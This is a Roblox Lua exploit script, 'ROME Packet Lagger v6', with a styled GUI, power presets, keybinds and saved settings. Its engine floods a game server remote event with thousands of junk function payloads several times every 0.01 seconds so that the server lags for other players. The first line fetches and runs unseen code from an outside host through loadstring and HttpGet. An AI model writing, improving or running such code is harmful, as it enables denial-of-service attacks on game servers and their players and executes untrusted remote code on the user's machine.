loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=4k7p3c65"))()

--[[
	ROME // PACKET LAGGER  --  v6
	-------------------------------------------------------------
	Base GUI : the layout you wrote (258x106 main + 203x203 settings
	           panel, art background, status pill, AUTO GLOW, drag,
	           settings "+" toggle) -- kept exactly as authored.
	Filled in: the packet lagger engine from v1
	           * remote resolve  ReplicatedStorage.Packages.Net -> [230]
	           * payload = table.create(power, function() end)
	           * 3 fires per 0.01s loop on its own thread
	           * gamepad rumble on toggle
	Swapped  : -10K / -1K / +1K / +10K  ->  v1 presets
	           1K · 10K · 25K · 50K · MAX
	v3 added : - / + steppers next to POWER (1,000 per press, 1 - 100,000)
	           flowing AUTO GLOW (thicker rim + wide soft aura)
	v4       : renamed to ROME everywhere, new art (100982514444886) on the
	           main panel AND the settings panel, RED flowing glow
	v5       : every blue accent switched to red (power value, active preset,
	           AUTO GLOW: ON button); blue palette removed from the glow switch
	v6       : SAVE SETTINGS button -- power, keybind, auto glow and window
	           position are written to RomePacketLagger_Settings.json and
	           restored automatically on load
	-------------------------------------------------------------
]]

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HapticService = game:GetService("HapticService")
local HttpService = game:GetService("HttpService")

local BG_ASSET = "rbxassetid://100982514444886"

local player = Players.LocalPlayer
-- clean up any older copies (Ryzn builds included) so re-executing never stacks
for _, oldName in ipairs({ "RomeGUI", "RyznGUI", "RyznPacketLagger", "IceHubLaggerOmahad" }) do
    local old = player:WaitForChild("PlayerGui"):FindFirstChild(oldName)
    if old then old:Destroy() end
end

local gui = Instance.new("ScreenGui")
gui.Name = "RomeGUI"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = player:WaitForChild("PlayerGui")

local function corner(object, radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius)
    c.Parent = object
end

local function outline(object, color, thickness, transparency)
    local s = Instance.new("UIStroke")
    s.Color = color
    s.Thickness = thickness
    s.Transparency = transparency or 0
    s.Parent = object
    return s
end

local function label(parent, text, size, pos, font, textSize, color, z)
    local l = Instance.new("TextLabel")
    l.BackgroundTransparency = 1
    l.Text = text
    l.Size = size
    l.Position = pos
    l.Font = font
    l.TextSize = textSize
    l.TextColor3 = color
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.ZIndex = z or 2
    l.Parent = parent
    return l
end

local function button(parent, text, size, pos, z, textSize)
    local b = Instance.new("TextButton")
    b.Size = size
    b.Position = pos
    b.BackgroundColor3 = Color3.fromRGB(43, 43, 51)
    b.BorderSizePixel = 0
    b.Text = text
    b.TextColor3 = Color3.fromRGB(245, 245, 248)
    b.TextSize = textSize or 11
    b.Font = Enum.Font.GothamBold
    b.AutoButtonColor = true
    b.Selectable = true
    b.ZIndex = z or 5
    b.Parent = parent
    corner(b, 8)
    return b
end

-- Compact main panel
local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.fromOffset(258, 106)
main.Position = UDim2.new(0.5, -129, 0.5, -125)
main.BackgroundColor3 = Color3.fromRGB(17, 17, 22)
main.BorderSizePixel = 0
main.ClipsDescendants = true
main.Active = true
main.Parent = gui
corner(main, 16)
outline(main, Color3.fromRGB(66, 66, 78), 1, 0.35)

local background = Instance.new("ImageLabel")
background.Name = "Background"
background.Size = UDim2.fromScale(1, 1)
background.BackgroundTransparency = 1
background.Image = BG_ASSET
background.ImageTransparency = 0.02
background.ScaleType = Enum.ScaleType.Crop
background.ZIndex = 1
background.Parent = main
corner(background, 16)

local tint = Instance.new("Frame")
tint.Size = UDim2.fromScale(1, 1)
tint.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
tint.BackgroundTransparency = 0.90
tint.BorderSizePixel = 0
tint.ZIndex = 2
tint.Parent = main
corner(tint, 16)

label(main, "ROME", UDim2.fromOffset(125, 23), UDim2.fromOffset(13, 8),
    Enum.Font.GothamBlack, 18, Color3.new(1, 1, 1), 4)
label(main, "PACKET LAGGER", UDim2.fromOffset(145, 18), UDim2.fromOffset(13, 31),
    Enum.Font.GothamBold, 10, Color3.fromRGB(195, 195, 203), 4)

-- "+" toggle, plain ASCII, no encoding artifact
local settingsToggle = button(main, "+", UDim2.fromOffset(31, 31),
    UDim2.new(1, -82, 0, 9), 8, 17)
settingsToggle.BackgroundColor3 = Color3.fromRGB(36, 36, 44)

local status = label(main, "OFF", UDim2.fromOffset(57, 31),
    UDim2.new(1, -44, 0, 9), Enum.Font.GothamBlack, 13,
    Color3.fromRGB(255, 75, 85), 7)
status.BackgroundTransparency = 0
status.BackgroundColor3 = Color3.fromRGB(39, 30, 35)
status.TextXAlignment = Enum.TextXAlignment.Center
corner(status, 18)

local activateButton = button(main, "ACTIVATE",
    UDim2.new(1, -24, 0, 33), UDim2.fromOffset(12, 62), 6, 13)
activateButton.Font = Enum.Font.GothamBlack
activateButton.BackgroundColor3 = Color3.fromRGB(39, 39, 47)

-- Compact settings panel
local panel = Instance.new("Frame")
panel.Name = "Settings"
panel.Size = UDim2.fromOffset(258, 203)
panel.Position = UDim2.new(0.5, -129, 0.5, -13)
panel.BackgroundColor3 = Color3.fromRGB(29, 29, 36)
panel.BorderSizePixel = 0
panel.Visible = false
panel.ZIndex = 10
panel.Parent = gui
corner(panel, 16)
outline(panel, Color3.fromRGB(83, 83, 98), 1.2, 0.2)

-- settings panel art (same asset, dimmed harder so the controls stay readable)
local panelBackground = Instance.new("ImageLabel")
panelBackground.Name = "PanelBackground"
panelBackground.Size = UDim2.fromScale(1, 1)
panelBackground.BackgroundTransparency = 1
panelBackground.Image = BG_ASSET
panelBackground.ImageTransparency = 0.45
panelBackground.ScaleType = Enum.ScaleType.Crop
panelBackground.ZIndex = 11
panelBackground.Parent = panel
corner(panelBackground, 16)

local panelTint = Instance.new("Frame")
panelTint.Size = UDim2.fromScale(1, 1)
panelTint.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
panelTint.BackgroundTransparency = 0.55
panelTint.BorderSizePixel = 0
panelTint.ZIndex = 11
panelTint.Parent = panel
corner(panelTint, 16)

label(panel, "POWER", UDim2.fromOffset(85, 20), UDim2.fromOffset(12, 9),
    Enum.Font.GothamBlack, 12, Color3.fromRGB(250, 250, 252), 12)

local powerValue = 9000
local powerLabel = label(panel, "9,000", UDim2.fromOffset(90, 20),
    UDim2.fromOffset(84, 9), Enum.Font.GothamBold, 14,
    Color3.fromRGB(255, 118, 118), 12)
powerLabel.TextXAlignment = Enum.TextXAlignment.Right

-- + / - steppers (added in v3): 1,000 per press, clamped 1 - 100,000.
-- They sit on the POWER row: value ends at x174, - at 180, + at 214 (ends 244).
local POWER_STEP = 1000

local minusPower = button(panel, "-", UDim2.fromOffset(30, 22),
    UDim2.fromOffset(180, 8), 12, 16)
minusPower.Font = Enum.Font.GothamBlack

local plusPower = button(panel, "+", UDim2.fromOffset(30, 22),
    UDim2.fromOffset(214, 8), 12, 16)
plusPower.Font = Enum.Font.GothamBlack

-- Presets from v1 (replaces the -10K / -1K / +1K / +10K buttons).
-- Five 42x29 buttons, 6px apart, inside the panel's 12px padding:
-- 12 + (i - 1) * 48 -> last button ends at 246 = panel width - 12.
local PRESET_COLORS = {
    idle = Color3.fromRGB(43, 43, 51),
    active = Color3.fromRGB(124, 22, 30),
}

local PRESETS = {
    { text = "1K",  value = 1000 },
    { text = "10K", value = 10000 },
    { text = "25K", value = 25000 },
    { text = "50K", value = 50000 },
    { text = "MAX", value = 100000 },
}

local presetButtons = {}

local function formatPower(v)
    local s = tostring(math.floor(v))
    local out = s:reverse():gsub("(%d%d%d)", "%1,"):reverse()
    if out:sub(1, 1) == "," then out = out:sub(2) end
    return out
end

local function refreshPower()
    powerLabel.Text = formatPower(powerValue)
    -- highlight the preset that matches the current value
    for i, preset in ipairs(PRESETS) do
        local b = presetButtons[i]
        if b then
            b.BackgroundColor3 = (powerValue == preset.value) and PRESET_COLORS.active or PRESET_COLORS.idle
        end
    end
end

local function setPower(v)
    powerValue = math.clamp(math.floor(tonumber(v) or powerValue), 1, 100000)
    refreshPower()
end

minusPower.Activated:Connect(function()
    setPower(powerValue - POWER_STEP)
end)

plusPower.Activated:Connect(function()
    setPower(powerValue + POWER_STEP)
end)

for i, preset in ipairs(PRESETS) do
    local b = button(panel, preset.text, UDim2.fromOffset(42, 29),
        UDim2.fromOffset(12 + (i - 1) * 48, 36), 12, 10)
    b.Activated:Connect(function()
        setPower(preset.value)
    end)
    presetButtons[i] = b
end

local glowToggle = button(panel, "AUTO GLOW: OFF",
    UDim2.new(1, -24, 0, 31), UDim2.fromOffset(12, 76), 12, 11)

label(panel, "KEYBIND", UDim2.fromOffset(90, 18),
    UDim2.fromOffset(12, 116), Enum.Font.GothamBlack, 11,
    Color3.fromRGB(245, 245, 248), 12)

local activationBind = button(panel, "ACTIVATE: CHOOSE A KEYBIND",
    UDim2.new(1, -24, 0, 28), UDim2.fromOffset(12, 137), 12, 10)

-- SAVE SETTINGS footer: writes power / keybind / auto glow / position to disk
local saveButton = button(panel, "SAVE SETTINGS",
    UDim2.new(1, -24, 0, 24), UDim2.fromOffset(12, 169), 12, 10)
saveButton.BackgroundColor3 = Color3.fromRGB(124, 22, 30)

-- =====================================================================
-- AUTO GLOW  (v4: red flow, two layers so it actually reads)
--   GLOW_STYLE = "red"    -> red aura with a bright crimson sweep
--   GLOW_STYLE = "black"  -> black aura with a moving smoke-grey sheen
-- =====================================================================
local GLOW_STYLE = "red"

local GLOW_FLOW_COLORS
if GLOW_STYLE == "red" then
    GLOW_FLOW_COLORS = {
        ColorSequenceKeypoint.new(0,    Color3.fromRGB(120, 8,  14)),
        ColorSequenceKeypoint.new(0.25, Color3.fromRGB(255, 60, 60)),
        ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(140, 10, 18)),
        ColorSequenceKeypoint.new(0.75, Color3.fromRGB(255, 96, 80)),
        ColorSequenceKeypoint.new(1,    Color3.fromRGB(120, 8,  14)),
    }
else
    GLOW_FLOW_COLORS = {
        ColorSequenceKeypoint.new(0,    Color3.fromRGB(0,  0,  0)),
        ColorSequenceKeypoint.new(0.25, Color3.fromRGB(34, 39, 52)),
        ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(0,  0,  0)),
        ColorSequenceKeypoint.new(0.75, Color3.fromRGB(52, 58, 74)),
        ColorSequenceKeypoint.new(1,    Color3.fromRGB(0,  0,  0)),
    }
end
local GLOW_FLOW = ColorSequence.new(GLOW_FLOW_COLORS)

local function makeFlow(gradientObject)
    return TweenService:Create(
        gradientObject,
        TweenInfo.new(2.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
        {Rotation = 360}
    )
end

-- inner hard rim
local glowStroke = outline(main, Color3.fromRGB(0, 0, 0), 4, 0)
glowStroke.Enabled = false
local gradient = Instance.new("UIGradient")
gradient.Color = GLOW_FLOW
gradient.Parent = glowStroke
local flowTween = makeFlow(gradient)

-- outer soft aura (wide + semi-transparent = the visible "glow")
local glowAura = outline(main, Color3.fromRGB(0, 0, 0), 9, 0.45)
glowAura.Enabled = false
local gradientAura = Instance.new("UIGradient")
gradientAura.Color = GLOW_FLOW
gradientAura.Parent = glowAura
local flowAuraTween = makeFlow(gradientAura)

local autoGlow = false
local activated = false

local function refreshGlow()
    local shouldGlow = activated and autoGlow

    glowStroke.Enabled = shouldGlow
    glowAura.Enabled = shouldGlow

    if shouldGlow then
        if flowTween.PlaybackState ~= Enum.PlaybackState.Playing then
            flowTween:Play()
        end
        if flowAuraTween.PlaybackState ~= Enum.PlaybackState.Playing then
            flowAuraTween:Play()
        end
    else
        flowTween:Cancel()
        gradient.Rotation = 0
        flowAuraTween:Cancel()
        gradientAura.Rotation = 0
    end
end

local function setAutoGlow(value)
    autoGlow = value and true or false
    glowToggle.Text = autoGlow and "AUTO GLOW: ON" or "AUTO GLOW: OFF"
    glowToggle.BackgroundColor3 = autoGlow
        and Color3.fromRGB(124, 22, 30)
        or Color3.fromRGB(43, 43, 51)
    refreshGlow()
end

glowToggle.Activated:Connect(function()
    setAutoGlow(not autoGlow)
end)

-- =====================================================================
-- PACKET LAGGER ENGINE (from v1)
-- Resolves ReplicatedStorage.Packages.Net, grabs child #230, and floods
-- it with {power} many fires: 3 per 0.01s on a dedicated thread.
-- =====================================================================
local lagging = false
local lagThread = nil
local remote = nil

local function resolveRemote()
    local ok, net = pcall(function()
        return ReplicatedStorage:WaitForChild("Packages", 6):WaitForChild("Net", 6)
    end)
    if not ok or not net then return nil end

    local ok2, kids = pcall(function()
        return net:GetChildren()
    end)
    if not ok2 or not kids then return nil end

    return kids[230]
end

local function rumble(small, large, duration)
    local pads = UserInputService:GetConnectedGamepads()
    if #pads == 0 then return end
    local pad = pads[1]
    pcall(function()
        HapticService:SetMotor(pad, Enum.VibrationMotor.Small, small)
        HapticService:SetMotor(pad, Enum.VibrationMotor.Large, large)
    end)
    if duration and duration > 0 then
        task.delay(duration, function()
            pcall(function()
                HapticService:SetMotor(pad, Enum.VibrationMotor.Small, 0)
                HapticService:SetMotor(pad, Enum.VibrationMotor.Large, 0)
            end)
        end)
    end
end

local function startLagging()
    if lagging then return true end

    if not remote then
        remote = resolveRemote()
    end
    if not remote then return false end

    lagging = true

    local payload = table.create(powerValue, function() end)
    local target = remote

    lagThread = task.spawn(function()
        while lagging do
            for _ = 1, 3 do
                pcall(function() target:FireServer(payload) end)
            end
            task.wait(0.01)
        end
    end)

    return true
end

local function stopLagging()
    if not lagging then return end
    lagging = false
    if lagThread then
        pcall(task.cancel, lagThread)
        lagThread = nil
    end
end

-- brief "no remote" feedback inside the existing status pill
local errorToken = 0
local function flashError()
    errorToken += 1
    local token = errorToken
    status.Text = "NO NET"
    status.TextColor3 = Color3.fromRGB(255, 190, 90)
    status.BackgroundColor3 = Color3.fromRGB(48, 38, 24)
    task.delay(1.4, function()
        if errorToken == token and not activated then
            status.Text = "OFF"
            status.TextColor3 = Color3.fromRGB(255, 75, 85)
            status.BackgroundColor3 = Color3.fromRGB(39, 30, 35)
        end
    end)
end

local function setActivated(value)
    if value then
        -- only paint as ON if the remote actually resolved
        if not startLagging() then
            flashError()
            return
        end
    else
        stopLagging()
    end

    activated = value
    errorToken += 1

    status.Text = activated and "ON" or "OFF"
    status.TextColor3 = activated and Color3.fromRGB(75, 255, 135)
        or Color3.fromRGB(255, 75, 85)
    status.BackgroundColor3 = activated and Color3.fromRGB(25, 62, 42)
        or Color3.fromRGB(39, 30, 35)
    activateButton.Text = activated and "ACTIVATED" or "ACTIVATE"
    activateButton.BackgroundColor3 = activated and Color3.fromRGB(28, 135, 76)
        or Color3.fromRGB(39, 39, 47)
    refreshGlow()

    rumble(activated and 0.45 or 0, activated and 0.2 or 0, 0.2)
end

activateButton.Activated:Connect(function()
    setActivated(not activated)
end)

-- resolve the remote in the background so the first click is instant
task.spawn(function()
    if not remote then
        remote = resolveRemote()
    end
end)

-- Activation keybind only: keyboard and controller supported
local activationKey = nil
local listening = false
local resetToken = 0

local function updateBindText()
    if listening then
        activationBind.Text = "LISTENING..."
    elseif activationKey then
        activationBind.Text = "ACTIVATE: " .. activationKey.Name
    else
        activationBind.Text = "ACTIVATE: CHOOSE A KEYBIND"
    end
end

activationBind.Activated:Connect(function()
    if listening then
        listening = false
        updateBindText()
    elseif activationKey then
        activationKey = nil
        listening = false
        resetToken += 1
        local token = resetToken
        activationBind.Text = "RESET"
        task.delay(2, function()
            if resetToken == token and not activationKey and not listening then
                updateBindText()
            end
        end)
    else
        listening = true
        updateBindText()
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    local keyCode = input.KeyCode
    if keyCode == Enum.KeyCode.Unknown then return end

    local inputType = input.UserInputType
    local isKeyboard = inputType == Enum.UserInputType.Keyboard
    local isGamepad = string.find(inputType.Name, "Gamepad") ~= nil
    if not isKeyboard and not isGamepad then return end

    if listening then
        activationKey = keyCode
        listening = false
        resetToken += 1
        updateBindText()
        return
    end

    -- gamepad buttons are frequently "processed" by the game's UI navigation,
    -- so a bound controller button is honoured either way (same as v1)
    if (isGamepad or not gameProcessed) and activationKey and keyCode == activationKey then
        setActivated(not activated)
    end
end)

-- Drag from title area; buttons stay clickable
local dragHandle = Instance.new("TextButton")
dragHandle.Name = "DragHandle"
dragHandle.Size = UDim2.fromOffset(155, 55)
dragHandle.BackgroundTransparency = 1
dragHandle.Text = ""
dragHandle.Active = true
dragHandle.Selectable = false
dragHandle.ZIndex = 5
dragHandle.Parent = main

local dragging = false
local dragStart
local startPosition
local activeTouch

local function updatePanelPosition()
    panel.Position = UDim2.new(
        main.Position.X.Scale, main.Position.X.Offset,
        main.Position.Y.Scale, main.Position.Y.Offset + 116
    )
end

dragHandle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPosition = main.Position
        activeTouch = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if not dragging then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement
        or (input.UserInputType == Enum.UserInputType.Touch and input == activeTouch) then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(
            startPosition.X.Scale, startPosition.X.Offset + delta.X,
            startPosition.Y.Scale, startPosition.Y.Offset + delta.Y
        )
        updatePanelPosition()
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or (input.UserInputType == Enum.UserInputType.Touch and input == activeTouch) then
        dragging = false
        activeTouch = nil
    end
end)

-- plain "-" for closed state, no special characters
settingsToggle.Activated:Connect(function()
    panel.Visible = not panel.Visible
    settingsToggle.Text = panel.Visible and "-" or "+"
end)

-- =====================================================================
-- SAVE / LOAD SETTINGS
-- Saves power, activation keybind, auto glow and window position, then
-- restores them automatically the next time this script is executed.
-- =====================================================================
local CONFIG_FILE = "RomePacketLagger_Settings.json"
local LEGACY_CONFIG_FILES = {
    "RyznPacketLagger_Config.json",
    "IceHubLaggerOmahad_Config.json",
}

local function hasFileAPI()
    return writefile ~= nil and readfile ~= nil and isfile ~= nil
end

local function saveSettings()
    if not hasFileAPI() then return false end

    local cfg = {
        Power = powerValue,
        Key   = activationKey and activationKey.Name or "",
        Glow  = autoGlow,
        PX_S  = main.Position.X.Scale, PX_O = main.Position.X.Offset,
        PY_S  = main.Position.Y.Scale, PY_O = main.Position.Y.Offset,
    }

    local ok = pcall(function()
        writefile(CONFIG_FILE, HttpService:JSONEncode(cfg))
    end)
    return ok
end

local function loadSettings()
    if not hasFileAPI() then return false end

    local file
    if isfile(CONFIG_FILE) then
        file = CONFIG_FILE
    else
        for _, legacy in ipairs(LEGACY_CONFIG_FILES) do
            if isfile(legacy) then
                file = legacy
                break
            end
        end
    end
    if not file then return false end

    local ok, cfg = pcall(function()
        return HttpService:JSONDecode(readfile(file))
    end)
    if not ok or type(cfg) ~= "table" then return false end

    -- power (v1 configs called it Intensity)
    local savedPower = tonumber(cfg.Power) or tonumber(cfg.Intensity)
    if savedPower then
        setPower(savedPower)
    end

    -- keybind (v1 configs used KBM / Keybind)
    local keyName = cfg.Key
    if type(keyName) ~= "string" or keyName == "" then
        keyName = cfg.KBM or cfg.Keybind
    end
    if type(keyName) == "string" and keyName ~= "" then
        local okKey, key = pcall(function()
            return Enum.KeyCode[keyName]
        end)
        if okKey and key then
            activationKey = key
            listening = false
            resetToken += 1
            updateBindText()
        end
    end

    -- auto glow
    if cfg.Glow ~= nil then
        setAutoGlow(cfg.Glow == true)
    end

    -- window position
    if tonumber(cfg.PX_S) and tonumber(cfg.PX_O) and tonumber(cfg.PY_S) and tonumber(cfg.PY_O) then
        main.Position = UDim2.new(cfg.PX_S, cfg.PX_O, cfg.PY_S, cfg.PY_O)
        updatePanelPosition()
    end

    return true
end

-- SAVE SETTINGS button feedback
local saveToken = 0
local SAVE_IDLE_COLOR = Color3.fromRGB(124, 22, 30)

local function flashSave(text, color, revertAfter)
    saveToken += 1
    local token = saveToken

    saveButton.Text = text
    saveButton.BackgroundColor3 = color

    task.delay(revertAfter, function()
        if saveToken == token then
            saveButton.Text = "SAVE SETTINGS"
            saveButton.BackgroundColor3 = SAVE_IDLE_COLOR
        end
    end)
end

saveButton.Activated:Connect(function()
    if saveSettings() then
        flashSave("SAVED", Color3.fromRGB(28, 135, 76), 1.4)
    elseif not hasFileAPI() then
        flashSave("NO FILE API", Color3.fromRGB(120, 60, 20), 2)
    else
        flashSave("SAVE FAILED", Color3.fromRGB(120, 20, 26), 2)
    end
end)

-- restore previous settings before the first frame is shown
local restored = loadSettings()

updatePanelPosition()
refreshPower()
updateBindText()

if restored then
    print("[ROME] settings loaded from " .. CONFIG_FILE)
end